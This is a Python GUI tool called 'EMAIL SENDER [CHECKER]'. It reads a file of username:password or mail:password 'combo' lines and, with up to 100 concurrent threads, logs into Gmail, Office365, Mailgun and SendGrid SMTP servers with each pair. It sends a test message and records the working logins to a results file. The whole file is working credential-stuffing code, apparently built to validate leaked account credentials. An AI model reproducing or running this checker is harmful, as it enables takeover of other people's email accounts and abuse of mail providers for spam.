import smtplib
import os
import time
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
from threading import Thread, Event, Semaphore

# List of public SMTP hosts with a default enabled status
smtp_hosts = {
    "Gmail": ("smtp.gmail.com", 587, True),      # Gmail
    "Office365": ("smtp.office365.com", 587, True),  # Office365
    "Mailgun": ("smtp.mailgun.org", 587, True),    # Mailgun
    "SendGrid": ("smtp.sendgrid.net", 587, True),   # SendGrid
}

class EmailSender:
    def __init__(self):
        self.running = True
        self.paused = False
        self.stop_event = Event()
        self.delay = 1  # Default delay in seconds
        self.enabled_hosts = []
        self.concurrent_limit = 100  # Default number of concurrent threads
        self.semaphore = Semaphore(self.concurrent_limit)

    def update_enabled_hosts(self):
        self.enabled_hosts = []
        for host_name, (host, port, enabled) in smtp_hosts.items():
            if enabled:
                self.enabled_hosts.append((host, port))

    def send_email(self, user_email, user_pass, recipient_email, progress_text_widget, result_file_path):
        self.update_enabled_hosts()  # Update the list of enabled hosts before sending
        for smtp_host, port in self.enabled_hosts:
            with self.semaphore:  # Limit the number of concurrent threads
                server = None
                try:
                    progress_text_widget.insert(tk.END, f"Trying {user_email} with {smtp_host}...\n")
                    progress_text_widget.see(tk.END)
                    app.update_idletasks()

                    server = smtplib.SMTP(smtp_host, port)
                    server.starttls()
                    server.login(user_email, user_pass)

                    # Create email content
                    subject = "Test Email"
                    body = "This is a test email sent from the SMTP script."
                    message = f"Subject: {subject}\n\n{body}"

                    # Send the email
                    server.sendmail(user_email, recipient_email, message)
                    result = f"{user_email}: Success using {smtp_host}"
                    progress_text_widget.insert(tk.END, result + "\n")
                    app.update_idletasks()

                    with open(result_file_path, "a") as result_file:
                        result_file.write(result + "\n")

                    break  # Exit the loop if successful
                except Exception as e:
                    progress_text_widget.insert(tk.END, f"{user_email}: {str(e)}\n")
                    app.update_idletasks()
                finally:
                    if server:
                        try:
                            server.quit()
                        except Exception:
                            pass
            
                # Check for pause or stop
                while self.paused:
                    time.sleep(1)
                    if self.stop_event.is_set():
                        return

                time.sleep(self.delay)  # Wait before trying the next host

    def start_sending(self, recipient_email, creds_file, progress_text_widget, result_file_path):
        credentials = load_credentials(creds_file)
        threads = []

        for user_email, user_pass in credentials:
            if self.stop_event.is_set():
                break
            user_email = user_email.strip()
            user_pass = user_pass.strip()
            thread = Thread(target=self.send_email, args=(user_email, user_pass, recipient_email, progress_text_widget, result_file_path))
            threads.append(thread)
            thread.start()

        # Wait for all threads to complete
        for thread in threads:
            thread.join()

def load_credentials(file_path):
    credentials = []
    with open(file_path, 'r') as file:
        for line in file:
            line = line.strip()
            if line:
                if option_var.get() == 1:  # Option 1: username:password
                    username = line.split(':')[0]
                    password = line.split(':')[1]
                    if "gmail.com" in username:
                        username = f"{username}@gmail.com"
                    elif "office365.com" in username:
                        username = f"{username}@office365.com"
                else:  # Option 2: mail:password
                    username = line.split(':')[0]
                    password = line.split(':')[1]
                credentials.append((username, password))  # Append the tuple
    return credentials

def thread_start_sending():
    global email_sender
    recipient_email = recipient_entry.get()
    creds_file = creds_entry.get()
    
    if not recipient_email or not creds_file:
        messagebox.showerror("Input Error", "Please specify both recipient email and credentials file.")
        return
    
    if not os.path.exists(creds_file):
        messagebox.showerror("File Error", "The specified credentials file does not exist.")
        return
    
    result_file_path = "SMTP/success_results.txt"
    os.makedirs(os.path.dirname(result_file_path), exist_ok=True)
    
    email_sender = EmailSender()
    email_sender.delay = int(delay_entry.get())  # Set the user-defined delay
    email_sender.concurrent_limit = int(concurrent_entry.get())  # Set the user-defined concurrency limit
    email_sender_thread = Thread(target=email_sender.start_sending, args=(recipient_email, creds_file, progress_text, result_file_path))
    email_sender_thread.start()

def pause_sending():
    email_sender.paused = True

def continue_sending():
    email_sender.paused = False

def stop_sending():
    email_sender.stop_event.set()

def update_smtp_selection():
    for host_name in smtp_hosts.keys():
        smtp_hosts[host_name] = (smtp_hosts[host_name][0], smtp_hosts[host_name][1], smtp_check_vars[host_name].get())

# Set up the GUI
app = tk.Tk()
app.title("EMAIL SENDER [CHECKER]")

# Option Selection
option_var = tk.IntVar(value=1)
tk.Label(app, text="Select Input Option:").grid(row=0, column=0, padx=10, pady=10)
tk.Radiobutton(app, text="Username:Password Combo", variable=option_var, value=1).grid(row=0, column=1, sticky='w')
tk.Radiobutton(app, text="Mail:Password Combo", variable=option_var, value=2).grid(row=0, column=2, sticky='w')

# Recipient Email Label and Entry
tk.Label(app, text="Recipient Email:").grid(row=1, column=0, padx=10, pady=10)
recipient_entry = tk.Entry(app, width=40)
recipient_entry.grid(row=1, column=1, padx=10, pady=10)

# Credentials File Label and Entry
tk.Label(app, text="Credentials File:").grid(row=2, column=0, padx=10, pady=10)
creds_entry = tk.Entry(app, width=40)
creds_entry.grid(row=2, column=1, padx=10, pady=10)

# Delay Label and Entry
tk.Label(app, text="Delay Between Attempts (s):").grid(row=3, column=0, padx=10, pady=10)
delay_entry = tk.Entry(app, width=5)
delay_entry.insert(0, "2")  # Default delay is 2 seconds
delay_entry.grid(row=3, column=1, padx=10, pady=10)

# Concurrent Threads Label and Entry
tk.Label(app, text="Concurrent Threads:").grid(row=4, column=0, padx=10, pady=10)
concurrent_entry = tk.Entry(app, width=5)
concurrent_entry.insert(0, "100")  # Default concurrent threads is 100
concurrent_entry.grid(row=4, column=1, padx=10, pady=10)

# Checkboxes for SMTP hosts
smtp_check_vars = {}
for i, (name, (host, port, enabled)) in enumerate(smtp_hosts.items()):
    var = tk.BooleanVar(value=enabled)
    smtp_check_vars[name] = var
    tk.Checkbutton(app, text=name, variable=var, command=update_smtp_selection).grid(row=5 + i, column=0, sticky='w', padx=10)

# Browse Button for Credentials File
def browse_file():
    filename = filedialog.askopenfilename(title="Select Credentials File", filetypes=(("Text Files", "*.txt"), ("All Files", "*.*")))
    if filename:
        creds_entry.delete(0, tk.END)
        creds_entry.insert(0, filename)

browse_button = tk.Button(app, text="Browse", command=browse_file)
browse_button.grid(row=2, column=2, padx=10, pady=10)

# Buttons to control sending
start_button = tk.Button(app, text="Send Emails", command=thread_start_sending)
start_button.grid(row=len(smtp_hosts) + 5, column=1, padx=10, pady=20)

pause_button = tk.Button(app, text="Pause", command=pause_sending)
pause_button.grid(row=len(smtp_hosts) + 6, column=0, padx=10, pady=5)

continue_button = tk.Button(app, text="Continue", command=continue_sending)
continue_button.grid(row=len(smtp_hosts) + 6, column=1, padx=10, pady=5)

stop_button = tk.Button(app, text="Stop", command=stop_sending)
stop_button.grid(row=len(smtp_hosts) + 6, column=2, padx=10, pady=5)

# ScrolledText for progress logging
progress_text = scrolledtext.ScrolledText(app, width=60, height=15)
progress_text.grid(row=len(smtp_hosts) + 7, column=0, columnspan=3, padx=10, pady=10)

# Run the GUI event loop
app.mainloop()
